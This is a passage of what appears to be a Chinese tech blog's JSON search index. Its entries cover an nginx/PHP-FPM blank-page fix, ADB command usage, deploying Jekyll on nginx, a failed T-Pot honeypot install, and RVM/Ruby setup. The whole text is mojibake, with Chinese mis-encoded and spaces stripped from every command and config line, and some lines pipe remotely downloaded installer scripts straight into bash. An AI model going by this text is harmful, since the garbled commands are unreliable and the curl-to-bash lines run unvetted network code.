è¯¯è®¿é—®index.phpï¼Œç»ˆäºçœ‹åˆ°äº†ç†Ÿæ‚‰çš„phpinfoé¡µé¢ï¼Œè‡³æ­¤æ’é”™ã€é…ç½®ç»“æŸã€‚2020-02-20æ›´æ–°ï¼šåœ¨linuxä¸‹é…ç½®å¥½nginxå’Œphp-fpmåï¼Œè®¿é—®webé¡µé¢ä¸èƒ½æ˜¾ç¤ºï¼ŒæŸ¥çœ‹nginxè®¿é—®æ—¥å¿—ï¼Œæ—¥å¿—æ˜¾ç¤ºè¿”å›200ï¼Œè®¿é—®æˆåŠŸã€‚htmlé™æ€é¡µé¢æ²¡é—®é¢˜ï¼Œä½†æ˜¯phpé¡µé¢æ€»æ˜¯ç©ºç™½é¡µä¹Ÿæ²¡æœ‰ä»»ä½•æŠ¥é”™ï¼Œç»è¿‡æŸ¥æ‰¾ï¼Œå‘ç°éœ€è¦åœ¨nginxä¸­åŠ å…¥ä¸€å¥è¯fastcgi_paramSCRIPT_FILENAME$document_root$fastcgi_script_name;å®‰è£…å®Œnginxåé»˜è®¤çš„fastcgi_paramsé…ç½®æ–‡ä»¶ä¸­æ²¡æœ‰ä¸Šé¢è¿™å¥è¯ã€‚åœ¨nginx.confä¸­çš„location~.php${roothtml;fastcgi_pass127.0.0.1:9000;fastcgi_indexindex.php;#fastcgi_paramSCRIPT_FILENAME/scripts$fastcgi_script_name;fastcgi_paramSCRIPT_FILENAME$document_root$fastcgi_script_name;includefastcgi_params;}æˆ–è€…åœ¨fastcgi_paramsé…ç½®æ–‡ä»¶ä¸­åŠ å…¥#PHPonly,requiredifPHPwasbuiltwithâ€“enable-force-cgi-redirectfastcgi_paramREDIRECT_STATUS200;fastcgi_paramSCRIPT_FILENAME$document_root$fastcgi_script_name;ç„¶åé‡å¯nginxå°±å¯ä»¥æ˜¾ç¤ºå‡ºé¡µé¢äº†ã€‚nginxä¸‹è¿è¡Œphpæ–‡ä»¶æ—¶è¿”å›200è®¿é—®ç©ºç™½é¡µ#502badgateway:aptè‡ªåŠ¨åŒ–å®‰è£…ï¼šé…ç½®/etc/php/7.3/fpm/pool.d/www.confæ–‡ä»¶ï¼šphp-fpm.conf:listen=127.0.0.1:9000nginx.conf:fastcgi_pass127.0.0.1:9000;php502badgatewayè§£å†³æ–¹æ³•ï¼šä»¥ä¸Šã€‚"
  },

  {
    "title"    : "ã€Œå®‰å“æ¸—é€ã€ï¼šå¤©ä¹‹éª„å­ADB",
    "category" : "",
    "tags"     : "ç¬”è®°, æ¸—é€, Android Reverse",
    "url"      : "/blog/2019/android/debug/brige/",
    "date"     : "Nov 30, 2019",
    "content"  : "adbç®€ä»‹adbï¼ˆAndroidDebugBridgeï¼‰Androidè°ƒè¯•æ¡¥æ˜¯ä¸€ç§åŠŸèƒ½å¤šæ ·çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯è®©è®¾å¤‡ä¹‹é—´ï¼ˆPCç«¯å’Œç§»åŠ¨ç«¯ï¼‰è¿›è¡Œé€šä¿¡ã€‚adbå‘½ä»¤ä¾¿äºæ‰§è¡Œå„ç§è®¾å¤‡æ“ä½œï¼ˆä¾‹å¦‚å®‰è£…å’Œè°ƒè¯•åº”ç”¨ï¼‰ï¼Œå¹¶æä¾›å¯¹UnixShellï¼ˆå¯ç”¨æ¥åœ¨è®¾å¤‡ä¸Šè¿è¡Œå„ç§å‘½ä»¤ï¼‰çš„è®¿é—®æƒé™ã€‚å®ƒæ˜¯ä¸€ç§å®¢æˆ·ç«¯-æœåŠ¡å™¨ç¨‹åºã€‚ä¸€ã€adbè¿æ¥æœ¬èœä½¿ç”¨çš„æ˜¯æ¨¡æ‹Ÿå™¨ï¼Œä¸åŒæ¨¡æ‹Ÿå™¨ç«¯å£ä¸ä¸€æ ·ã€‚æ¯”å¦‚è°·æ­Œæ¨¡æ‹Ÿå™¨ç«¯å£åˆ™é»˜è®¤ä¸º5555;$adbconnect127.0.0.1:21503adbserverisoutofdate.killing...*daemonstartedsuccessfully*connectedto127.0.0.1:21503$adbdevicesListofdevicesattached127.0.0.1:21503deviceäºŒã€adbå¸¸ä½¿ç”¨å‘½ä»¤Linuxä¸‹çš„å‘½ä»¤å°±ä¸å¤šè¯´äº†;ç›´æ¥çœ‹adbçš„å¸¸ç”¨å‘½ä»¤(åœ¨pcç«¯æ§åˆ¶å°æŸ¥çœ‹ã€ä½¿ç”¨)AndroidDebugBridgeversion1.0.32devicecommands:1.adbpushé¡¾åæ€ä¹‰ï¼Œpushï¼Œæ¨é€ï¼šåœ¨pcç«¯æ§åˆ¶å°å°†pcç«¯çš„æ–‡ä»¶(å¤¹)pushåˆ°ç§»åŠ¨ç«¯ï¼Œç”¨æ³•å®ä¾‹ï¼š$adbpushinject/data/local1606KB/s(17936bytesin0.010s)è¿›å…¥å®‰å“æ‰‹æœºéªŒè¯:root@SM-G9350:/data/local#lsgdbinjecttmpå¦‚ä¸Šæ‰€ç¤ºinjectæ–‡ä»¶è¢«pushåˆ°å®‰å“æœºä¸­ã€‚2.adbpullä¸pushç›¸ååœ¨pcç«¯æ§åˆ¶å°å°†ç§»åŠ¨ç«¯çš„æ–‡ä»¶(å¤¹)pullåˆ°pcç«¯ã€‚$adbpull/data/local/injectC:\\Users\\æœ¬é˜¿ä¿¡2507KB/s(17936bytesin0.006s)åœ¨pullæ–‡ä»¶å¤¹æ§åˆ¶å°éªŒè¯:$diré©±åŠ¨å™¨Cä¸­çš„å·æ˜¯rootå·çš„åºåˆ—å·æ˜¯0009-A6D5C:\\Users\\æœ¬é˜¿ä¿¡çš„ç›®å½•ï¼ˆæ­¤ä¸‹DIRä¸ºå°–æ‹¬å·ï¼Œä¼šå°†æ–‡æœ¬æ ¼å¼é—­åˆï¼Œæ‰€ä»¥æ¢æˆæ‹¬å·ï¼‰2019/11/3022:25ï¼ˆDIRï¼‰.2019/11/3022:25ï¼ˆDIRï¼‰..2019/11/2817:15ï¼ˆDIRï¼‰.android2019/11/2817:44ï¼ˆDIRï¼‰.idlerc2019/11/3022:03ï¼ˆDIRï¼‰.MemuHyperv2019/10/1622:05ï¼ˆDIRï¼‰.ssh2019/11/3022:2517,936injectå¦‚ä¸Šæ‰€ç¤ºinjectæ–‡ä»¶å·²ç»è¢«pullåˆ°pcç«¯äº†ã€‚3.adbshellæ‰“å¼€è¿›å…¥å·²è¿æ¥å®‰å“æœºçš„shell;adbæç¤ºå·²ç»è¿æ¥ä¸Šäº†å®‰å“æ‰‹æœºï¼Œç›´æ¥è¿›å…¥ç³»ç»Ÿã€‚$adbshellroot@SM-G9350:/#whoamirootroot@SM-G9350:/#pwd/root@SM-G9350:/#uname-aLinuxlocalhost4.0.9#661SMPPREEMPTMonNov413:15:47CST2019i686GNU/Linuxå¯ä»¥å‘ç°æœ‰ç†Ÿæ‚‰çš„Linuxç³»ç»Ÿçš„å½±å­~4.adbshellåç¼€åŠ å…¥command,ä¸åŒäº3runremoteshellcommandè¿œç¨‹è¿è¡Œshellå‘½ä»¤ã€‚æ§åˆ¶å°ä¸è¿›å…¥AndriodShell;$adbshelluname-aLinuxlocalhost4.0.9#661SMPPREEMPTMonNov413:15:47CST2019i686GNU/Linuxå¦‚ä¸Šï¼Œæ§åˆ¶å°å›æ˜¾ä¿¡æ¯ï¼Œä½†æ­¤æ—¶è¿˜æ˜¯åœ¨pcç«¯æ§åˆ¶å°ï¼Œå¹¶æ²¡æœ‰è¿›å…¥å®‰å“æ§åˆ¶å°ã€‚5.adblogcat[]-ViewdevicelogæŸ¥çœ‹è®¾å¤‡æ—¥å¿—:æŸ¥çœ‹æ‰€æœ‰æ—¥å¿—ï¼š$adblogcat---------beginningofmainI/Netd(0):Netd1.0startingE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/default/accept_ra_rt_table:NosuchfileordirectoryE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/eth0/accept_ra_rt_table:NosuchfileordirectoryE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/ifb0/accept_ra_rt_table:NosuchfileordirectoryE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/ifb1/accept_ra_rt_table:NosuchfileordirectoryE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/lo/accept_ra_rt_table:NosuchfileordirectoryE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/sit0/accept_ra_rt_table:NosuchfileordirectoryI/installd(0):installdfiringupI/(0):debuggerd:Apr4201917:10:30è¿‡æ»¤æ—¥å¿—:$adblogcatE/WifiStateMachineE/WifiStateMachine(509):WifiStateMachineCMD_START_SCANsource-2txSuccessRate=-0.00rxSuccessRate=-0.00targetRoamBSSID=anyRSSI=-55E/WifiStateMachine(509):WifiStateMachineCMD_START_SCANsource-2txSuccessRate=-0.00rxSuccessRate=-0.00targetRoamBSSID=anyRSSI=-55E/WifiStateMachine(509):WifiStateMachineCMD_START_SCANsource-2txSuccessRate=-0.00rxSuccessRate=-0.00targetRoamBSSID=anyRSSI=-55E/WifiStateMachine(509):WifiStateMachineshouldSwitchNetworktxSuccessRate=-0.00rxSuccessRate=-0.00delta999-&gt;999E/WifiStateMachine(509):CMD_AUTO_ROAMsupstateCompletedStatemystateConnectedStatenid=0config\"lgrut25642\"NONEroam=1toanytargetRoamBSSIDanyE/WifiStateMachine(509):AUTO_ROAMnothingtodoE/WifiStateMachine(509):WifiStateMachineCMD_START_SCANsource-2txSuccessRate=-0.00rxSuccessRate=-0.00targetRoamBSSID=anyRSSI=-556.adbinstall[-lrtsd]å®‰è£…1.apkå‘½ä»¤ï¼ˆåœ¨pcç«¯ï¼Œä¸”1.apkä¸ºç»å¯¹è·¯å¾„ï¼‰$adbinstall1.apk3480KB/s(54687952bytesin15.344s)pkg:/data/local/tmp/1.apkSuccess7.adbuninstall[-k]-removethisapppackagefromthedevice('-k'meanskeepthedataandcachedirectories)$adbuninstall[-k]com.com.pack\tSuccess\t-kå‚æ•°å€¼ä¿å­˜å®‰è£…æ•°æ®å’Œç¼“å­˜ã€‚8.adbhelp-showthishelpmessage;æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯9.adbversion-showversionnum;æ˜¾ç¤ºç‰ˆæœ¬å·â€”â€”â€”â€”â€”â€”â€”â€”åä¸½åˆ†å‰²çº¿â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”ä»¥ä¸Š,è®°å½•ã€‚"
  },

  {
    "title"    : "å¤šå­åŸŸï¼šJEKYLLä¼˜é›…åœ°éƒ¨ç½²äºNGINX",
    "category" : "",
    "tags"     : "Web, æŠ€å·§",
    "url"      : "/blog/2019/nginx/with/jekyll-site/",
    "date"     : "Nov 22, 2019",
    "content"  : "æœ¬æ–‡ä¸»è¦ä»‹ç»æœåŠ¡ç«¯çš„Jekyllç«™ç‚¹éƒ¨ç½²æ–¹æ³•ï¼Œä»¥åŠç›¸å…³çš„ä¸€æ½å­é—®é¢˜åŠè§£å†³æ–¹æ¡ˆï¼›äº2021å¹´6æœˆ27æ—¥æ˜ŸæœŸæ—¥20æ—¶19åˆ†07ç§’CSTä¿®æ”¹ï¼Œä¸ªäººå»ºè®®ä¼˜é›…åœ°ä½¿ç”¨ï¼šé˜è¿°Jekyllçš„å·¥ä½œé—®é¢˜ï¼›è§£å†³å¤šå­åŸŸé—®é¢˜ï¼šnginxé…ç½®æ–‡ä»¶ï¼Œä½¿å¾—nginxæ–‡ä»¶é…ç½®æ›´åŠ å®¹æ˜“ç§»æ¤ã€è¿ç»´â€¦.è§£å†³Webä»£ç æ›´æ–°é—®é¢˜ï¼šGitXB4xinSynchronizeä½¿ç”¨nginxä½œä¸ºjekyllåšå®¢çš„æœåŠ¡å¯åŠ¨å®¹å™¨ä»‹ç»ï¼šé›¶ï¼šJekyllå¦‚ä½•å·¥ä½œé¦–å…ˆå…ˆä»ç”¨æˆ·è§’åº¦è§£é‡Šä¸€ä¸‹æˆ‘ç†è§£ä¸­çš„jekyllæœåŠ¡çš„è¿è¡ŒåŸç†1.ç¼–å†™markdownæ–‡æ¡£-&gt;2.markdownè§£æ-&gt;3.jekyllè¿è¡Œç”Ÿæˆwebç«™ç‚¹æ–‡ä»¶æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å»æ‰¾ç«™ç‚¹æ–‡ä»¶å¤¹ï¼ŒæŠŠwebç«™ç‚¹æ–‡ä»¶å¤¹å¤åˆ¶åˆ°nginxçš„æ ¹ç›®å½•ä¸‹å°±å¥½äº†$cd/your-jekyll-web/$ls$cd_post/$vi2019-01-01-your-article-title.markdown$cp_site//var/www/html/-r$nginx-tnginx:theconfigurationfile/etc/nginx/nginx.confsyntaxisoknginx:configurationfile/etc/nginx/nginx.conftestissuccessfulsystemctlstartnginx$curllocalhostæµ‹è¯•nginxå®Œæ¯•æ²¡æœ‰é—®é¢˜ï¼Œæ—¢å¯ä»¥ç›´æ¥å¯åŠ¨nginxã€‚ç„¶åçœ‹ä¸€ä¸‹æœ¬åœ°é¡µé¢ï¼Œå¦‚æœå‡ºç°æœ¬åœ°é¡µé¢å°±æ˜¯è°ƒè¯•å®Œæˆäº†ã€‚ä¸€ï¼šé…ç½®Nginx-ServerNginxçš„ä½¿ç”¨è‡ªä¸å¿…å¤šè¯´ï¼›è¿™é‡Œæƒ³è¦ä¼ è¾¾å‡ºçš„æ˜¯ä¸€äº›å…³äºå¦‚ä½•ä¼˜é›…çš„æ¥é…ç½®Nginxï¼šAå­åŸŸï¼š$vi/{path/to/nginx/dir}/sites-enabled/Aserver{#listen80default_server;#listen[::]:80default_server;location/{root/{path/to/your/www/dir}/about;indexindex.htmlindex.htm;try_files$uri$uri/=404;}error_page404403500502503504/404.html;location=/404.html{root/{path/to/your/www/dir}/about;}listen443;sslon;server_nameA.domain.com;ssl_certificate/etc/nginx/{path/to/your/cert}/.crt;ssl_certificate_key/etc/nginx/{path/to/your/key}/.key;ssl_session_cacheshared:SSL:1m;ssl_session_timeout5m;ssl_ciphersECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;ssl_prefer_server_cipherson;ssl_protocolsTLSv1TLSv1.1TLSv1.2;}Bå­åŸŸ$vi/{path/to/nginx/dir}/sites-enabled/Båï¼ŒåŒæ ·é…ç½®å°±å¥½åŒæ ·æµ‹è¯•ä¸€ä¸‹ï¼Œæ²¡é—®é¢˜å°±å¯ä»¥äº†ï¼Œå¸Œæœ›ä½ ä»¬è‡ªå·±ä¹Ÿèƒ½åŠ¨æ‰‹è¯•è¯•çœ‹ã€‚ä»¥ä¸ŠäºŒï¼šä»£ç æ›´æ–°-B4xinSync#2x01ä»€ä¹ˆæ˜¯B4xinSynchronizeåŠŸèƒ½åŸºäºåŒç«¯ä»£ç åŒæ­¥è„šæœ¬ï¼Œè®©æ‚¨çš„gitä»…æ˜¯æˆ–å¦Letyourgitonlyyesornoé€‚ç”¨åœºæ™¯å°†æœ¬åœ°è°ƒè¯•å®Œæˆçš„ä»£ç æ‹·è´åˆ°å·¥ä½œç›®å½•ï¼ˆå¦‚jekyllã€githubï¼‰ï¼›å°†å·¥ä½œç›®å½•çš„ä»£ç pushè‡³githubä»“åº“æˆ–æœåŠ¡ç«¯ï¼›æœåŠ¡ç«¯è‡ªåŠ¨æ›´æ–°gitä¸Šä¼ ä»£ç ã€‚#2x02è§£å†³æ–¹æ¡ˆä¿®æ”¹B4xinSynchronize/bash/config/user_config.shï¼Œæ³¨æ„äº‹é¡¹ï¼šoptions_project_{i}çš„å€¼è¿æ¥ç¬¦ä¸ºä¸‹åˆ’çº¿ï¼Œ{i}è‡ªå®šä¹‰dwæ¨¡å¼ç›®å½•éœ€åŠ å…¥gitPathã€buildPathï¼Œå¦åˆ™ä¼šæŠ¥Invalidï¼Œswæ¨¡å¼åŒç†##project:$your_repo_nameoptions_$your_repo_name_{i}=\"your_repo_name\"_${run_mode}_$your_repo_name_gitPath=\"/path/to/your/repo/name\"_${run_mode}_$your_repo_name_buildPath\"/path/to/your/build/project/\"##example:##dwmodeproject0:bin4xin_github_iooptionsoptions_project_0=\"bin4xin_github_io\"_dw_bin4xin_github_io_gitPath=\"/Users/bin4xin/blog/github-code/bin4xin.github.io\"_dw_bin4xin_github_io_buildPath=\"/Users/bin4xin/blog/SENTRYLAB-WWW-WEB/_site\"#swmodeproject4:B4xinSynchronizeoptionsoptions_project_4=\"B4xinSynchronize\"_sw_B4xinSynchronize_gitPath=\"/Users/bin4xin/blog/github-code/B4xinSynchronize\"bashç»ˆç«¯å‘½ä»¤clientç«¯$brewinstallgawk$gitclonehttps://github.com/Bin4xin/B4xinSynchronize.git$cdB4xinSynchronize/bash$bashSclient.sh[dw/sw]â—[Info]Areyousure?(y/n):â—[Info]Runningmodeis:swmodenowlooksyouhavevarfilesnow!â—[Info]Detected[Repo0]:bin4xin_github_ioâ—[Info]Detected[Repo1]:bin4xin_gitee_ioâ—[Info]Detected[Repo2]:sentrylab_tokyo_wwwâ—[Info]Detected[Repo3]:sentrylab_tokyo_aboutâ—[Info]Detected[Repo4]:B4xinSynchronizeâ—[Info]Detected[Repo5]:sweet_ysoserialâ—[Info]Detected[Repo6]:Bin4xinâ—[Info]Detected[Repo7]:bigger_than_biggerâ—[Info]Detected[Repo8]:Industrial_Control_Wiki_RecordChooseyourReposoption(defaultoption:0)[0/1/..]:4Thisisavalidgitrepository(butthecurrentworkingdirectorymaynotbethetoplevel.Checktheoutputofthegitrev-parsecommandifyoucare)â—[Info]DirectlyjumpingtoSynchronizeupdate.../Users/bin4xin/blog/github-code/B4xinSynchronizeâ—[Info]Synchronizeupdateisrunningin/Users/bin4xin/blog/github-code/B4xinSynchronizeâ—[Info]Synchronizeupdateisrunning...[masterbb5fdd0]Tue,18May202123:39:57+0800commitbyB4xinSynchronize.2fileschanged,8insertions(+),8deletions(-)Enumeratingobjects:9,done.Countingobjects:100%(9/9),done.Deltacompressionusingupto8threadsCompressingobjects:100%(5/5),done.Writingobjects:100%(5/5),573bytes|573.00KiB/s,done.Total5(delta4),reused0(delta0),pack-reused0remote:Resolvingdeltas:100%(4/4),completedwith4localobjects.Tohttps://github.com/Bin4xin/B4xinSynchronize.git21314fc..bb5fdd0master-&gt;masterserverç«¯$bashSserver.sh[/path/to/git/workspace/]â—è¿è¡Œä¸­...ä»»åŠ¡è¿›è¡Œä¸­:[Crontabå®šæ—¶è®¡åˆ’å¤‡ä»½][å†™å…¥Crontabå®šæ—¶è®¡åˆ’][æ‰§è¡ŒCrontabå®šæ—¶è®¡åˆ’]å¤‡ä»½æ‚¨çš„å½“å‰çš„Crontabè®¡åˆ’æ‰§è¡Œæ·»åŠ æœ€æ–°çš„Crontabè®¡åˆ’ï¼š[==================================================&gt;][å¤‡ä»½è®¡åˆ’]&gt;&gt;[crontab-l&gt;config/golbal_var.sh.]...â—[Info]ä»»åŠ¡1:[Crontabå®šæ—¶è®¡åˆ’å¤‡ä»½]----------&gt;DONE.....[å†™å…¥è®¡åˆ’]&gt;&gt;[config/golbal_var.sh]...â—[Info]ä»»åŠ¡2:[å†™å…¥Crontabå®šæ—¶è®¡åˆ’]----------&gt;DONE.....[æ‰§è¡Œè®¡åˆ’]&lt;&lt;[config/golbal_var.sh]...â—[Info]ä»»åŠ¡3:[æ‰§è¡ŒCrontabå®šæ—¶è®¡åˆ’]----------&gt;DONE.....å½“å‰æœ€æ–°Crontabè®¡åˆ’è¡¨ä¸ºï¼šâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—â•‘*****gitcheckout-fâ•‘â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ALLDONE...#2x03å…¶ä»–å…¶ä»–ç›¸å…³ä»‹ç»å¯ä»¥å‚è€ƒB4xinSynchronizeä»“åº“ä»‹ç»"
  },

  {
    "title"    : "Dockerç¯å¢ƒä¸‹T-potèœœç½éƒ¨ç½²è®°å½•",
    "category" : "",
    "tags"     : "å®‰å…¨å·¥å…·, ä¸»åŠ¨é˜²å¾¡",
    "url"      : "/blog/2019/docker/t/pot/",
    "date"     : "Nov 21, 2019",
    "content"  : "æ‘˜è¦:æœ€è¿‘åœ¨ç½‘ä¸Šå†²æµªçœ‹åˆ°ä¸€ä¸ªå¼€æºèœœç½é¡¹ç›®ï¼Œçœ‹åˆ°æ˜¯åŸºäºwebçš„èœœç½é¡¹ç›®ï¼Œwebé¡µé¢æ˜¯çœŸå¥½çœ‹ã€‚çªå‘å¥‡æƒ³æ­£å¥½æ‰‹å¤´æœ‰ä¸ªå…¬ç½‘ipï¼Œæœ€è¿‘ä¹Ÿåœ¨ä¸ºè®ºæ–‡æ•°æ®æ¥æºå‘æ„ï¼Œç´¢æ€§æ¥è¯•è¯•çœ‹ã€‚å…ˆè¯´ç»“è®ºï¼Œå®‰è£…å¤±è´¥ã€‚æœ¬ç¯‡æŒç»­æ›´æ–°ï½ï¼ˆæ»‘ç¨½ï¼‰çœ‹ä»‹ç»é¡¹ç›®çš„å¸–å­è¯´ï¼Œæœ€æ–°ç‰ˆT-pot18æ˜¯åŸºäºubuntuserver18.04TLSè¿›è¡Œéƒ¨ç½²ã€‚æœæ–­ä½¿ç”¨dockerè¯•è¯•ï½1.dockerå®‰è£…ä½¿ç”¨1.1ä½¿ç”¨apt-getè¿›è¡Œå®‰è£…å®‰è£…å¿…è¦çš„ä¸€äº›ç³»ç»Ÿå·¥å…·sudoapt-getupdatesudoapt-get-yinstallapt-transport-httpsca-certificatescurlsoftware-properties-commonå®‰è£…GPGè¯ä¹¦curl-fsSLhttp://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg|sudoapt-keyadd-å†™å…¥è½¯ä»¶æºä¿¡æ¯sudoadd-apt-repository\"deb[arch=amd64]http://mirrors.aliyun.com/docker-ce/linux/ubuntu$(lsb_release-cs)stable\"æ›´æ–°å¹¶å®‰è£…Docker-CEsudoapt-get-yupdatesudoapt-get-yinstalldocker-ce2.dockerä½¿ç”¨è¯­æ³•#æŸ¥çœ‹å½“å‰ç¯å¢ƒä¸‹dockeræ‹¥æœ‰çš„é•œåƒdockerimages#ä½¿ç”¨å®¿ä¸»æœº80ç«¯å£æ˜ å°„ä¸”è¿è¡Œubuntué•œåƒï¼Œé•œåƒä½¿ç”¨bashæ‰§è¡Œdockerrun-it-p80:80ubuntu/bin/bash#ä¿å­˜æŒ‡ä»¤ï¼Œç”±äºdockerä¸ä¼šè¿›è¡Œå®¹å™¨ä¿®æ”¹çš„ä¿å­˜ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨ä¿å­˜dockercommit-a\"runoob.com\"-m\"myapache\"a404c6c174a2mymysql:v1#è¿è¡Œä¿å­˜çš„å®¹å™¨dockerrun-it-p80:80ubuntu:v13.dockerä¸­netselect-aptæŠ¥é”™.3.1å®‰è£…netselect-aptä¾èµ–çš„netselectåŒ…å®‰è£…netselectä¹‹å‰æ— æ³•å®‰è£…netselect-aptï¼Œä¼šæŠ¥é”™ã€‚å³netselectæ˜¯å¿…é¡»ä¾èµ–é¡¹å®‰è£…netselect_0.3.ds1-28+b1_amd64.debwgethttp://ftp.cn.debian.org/debian/pool/main/n/netselect/netselect_0.3.ds1-28+b1_amd64.debdpkg-inetselect_0.3.ds1-28+b1_amd64.deb3.2netselectåŒ…å®‰è£…æŠ¥é”™ä»¥ä¸‹ä¸¤ä¸ªæ˜¯æœ¬èœdockerå®‰è£…æ—¶å‡ºç°çš„ä¾èµ–é¡¹ï¼Œè´´å‡ºæ¥ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ç¼ºä»€ä¹ˆè£…ä»€ä¹ˆå°±è¡Œäº†ã€‚è§£å†³\"Can'tlocateTerm/ReadLine.pm\"å®‰è£…:aptinstalllibterm-readkey-perl-yè§£å†³\"Nousabledialog-likeprogramisinstalled\"å®‰è£…:aptinstalldialog3.3å®‰è£…netselect-aptåŒ…wgethttp://ftp.cn.debian.org/debian/pool/main/n/netselect/netselect-apt_0.3.ds1-28_all.debdpkg-inetselect-apt_0.3.ds1-28_all.debå®‰è£…ç»“æŸåº”æ— ä»»ä½•æŠ¥é”™ï¼Œå³ä»£è¡¨æˆåŠŸï¼›ä¹Ÿå¯ä»¥é€šè¿‡è¾“å…¥ä¸¤ä¸ªåŒ…è¿›è¡ŒéªŒè¯ã€‚4.å®‰è£…T-POTèœœç½cdtpotce/iso/install./install.sh--type=auto--conf=tpot.conf#è‡ªåŠ¨ç¼–è¯‘é…ç½®ï¼Œé…ç½®æ–‡ä»¶ä¸ºtpot.confcptpot.conf.disttpot.conf#ç”Ÿæˆé…ç½®æ–‡ä»¶æŠ¥é”™Aborting:debianbionicisnotsupport.çœ‹æ ·å­æ˜¯ç³»ç»Ÿç‰ˆæœ¬çš„é—®é¢˜ï¼Œæ— æ³•è§£å†³ã€‚ï½æäº†ä¸€ä¸‹åˆï¼Œè„‘é˜”ç–¼ã€‚"
  },

  {
    "title"    : "ã€Œç¬”è®°ã€ï¼šJekyll for linux.æœåŠ¡å™¨éƒ¨ç½²å†ç¨‹",
    "category" : "",
    "tags"     : "ç¬”è®°, è½¯ä»¶ç§»æ¤",
    "url"      : "/blog/2019/jekyll/in/linux/",
    "date"     : "Nov 18, 2019",
    "content"  : "ç”³æ˜ï¼šèƒŒæ™¯å›¾æ¥è‡ªå¾®åš@èƒ¡æ­Œï¼Œä¾µåˆ ï½ä¸è¿‡èƒ¡æ­Œè¿™ä¹ˆå¯çˆ±åº”è¯¥ä¸ä¼šä»‹æ„çš„ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šè¿™ç©æ„å„¿æ˜¯ä»€ä¹ˆï¼Ÿé€šä¿—çš„æ¥è®²ï¼šJekyll=webserver+staticblog+frontendUIå¦‚æœä½ æƒ³æ‹¥æœ‰ä¸€ä¸ªè‡ªå·±çš„åšå®¢ä½†æ˜¯è‹¦äºæ•°æ®åº“æ²¡å­¦å¥½ï¼Œä½ å¯ä»¥æ¥è¯•è¯•çœ‹ï¼›å†å¦‚æœæƒ³å­¦å‰ç«¯ï¼Œä½ ä¹Ÿå¯ä»¥è¯•è¯•çœ‹ï½åšé…ç½®å‰è¯·é»˜å¿µä¸‰éå››è€…ä¹‹é—´çš„å…³ç³»ï¼Œä¿è¯å€’èƒŒå¦‚æµåœ¨è¿›è¡Œä¸‹ä¸€æ­¥ï¼š1.Rubyæ˜¯è¯­è¨€ã€‚2.gemæ˜¯ä¸€ç»„Rubyç¨‹åºï¼Œç±»ä¼¼äºã€ŒåŒ…ã€çš„æ¦‚å¿µã€‚3.RubyGemsæ˜¯Rubyçš„åŒ…ç®¡ç†å™¨ï¼Œç”¨æ¥ç®¡ç†å’Œå®‰è£…gemsçš„ã€‚4.bundleæ˜¯ç”¨æ¥ç®¡ç†gemsçš„é¡¹ç›®ï¼Œç¡®ä¿èƒ½å¤Ÿæ­£ç¡®åœ°å®‰è£…é¡¹ç›®ä¾èµ–ï¼Œç¡®ä¿èƒ½å¤Ÿè¿è¡Œæ­£ç¡®çš„åŒ…ã€‚1.RVMå®‰è£…gpg--keyserverhkp://keys.gnupg.net--recv-keys409B6B1796C275462A1703113804BB82D39DC0E3curl-sSLhttps://get.rvm.io|bash-sstable##å¦‚æœä¸Šé¢ç§˜é’¥å¯¼å…¥å¤±è´¥ä¼šæç¤ºcommandå»ºè®®ï¼Œç›´æ¥å¤åˆ¶ä¸‹æ¥ï¼Œå®åœ¨ä¸è¡Œæ‰¾ä¸åˆ°ä½¿ç”¨ä¸‹é¢è¿™ä¸ªé“¾æ¥ä¸‹è½½ã€‚curl-Lhttps://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer|bash-sstablesource/usr/local/rvm/scripts/rvm##é…ç½®ä¸€æ¬¡æ€§å˜é‡ï¼Œè¿™é‡Œterminalæš‚æ—¶ä½¿ç”¨ä¸€ä¸‹ã€‚ç†Ÿæ‚‰çš„æœ‹å‹å¯ä»¥ç›´æ¥é…è¿›bashrcè‡ªå¯æœŸé—´ä¼šå®‰è£…å„ç§ä¾èµ–åŒ…ï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´åå‡ºç°completeå­—æ ·å³æˆåŠŸå®‰è£…ã€‚2.rubyå®‰è£…2.1åˆ‡æ¢rvmæºæ¥ç€å°±æ˜¯æ¢æºï¼Œè€å¤–ç½‘çœŸçš„æ…¢--æ²¡åŠæ³•,è·Ÿlinuxæ¢æºæ˜¯ä¸€ä¸ªé“ç†#echo\"ruby_url=https://cache.ruby-china.org/pub/ruby\"&gt;~/.rvm/user/db#æ­¤å¤„æœ¬èœæœºå­çš„æ˜¯.rvmrcï¼Œç›´æ¥æŠŠurlå¯¼å…¥ï¼š#echo\"ruby_url=https://cache.ruby-china.org/pub/ruby\"&gt;/root/.rvmrc========================2020-03-31æ›´æ–°ï¼šæ¢æºæ–‡ä»¶=================================+==============================================================================+|echo\"ruby_url=https://cache.ruby-china.com/pub/ruby\"&gt;/usr/local/rvm/user/db|+==============================================================================+æ‰¾ä¸åˆ°æ›´æ–°rvmæºçš„æ–‡ä»¶ï¼Œå¦‚æœæ˜¯æŒ‰ç…§ä¸Šé¢æ–¹æ³•ï¼ŒåŸºæœ¬æ˜¯åœ¨ä¸Šé¢è¿™ä¸ªæ–‡ä»¶ä¸‹ã€‚[root@iZ2ze9ebgot9gy5c2mi5ecZuser]#echo\"ruby_url=https://cache.ruby-china.com/pub/ruby\"&gt;/usr/local/rvm/user/db[root@iZ2ze9ebgot9gy5c2mi5ecZuser]#catdbruby_url=https://cache.ruby-china.com/pub/ruby[root@iZ2ze9ebgot9gy5c2mi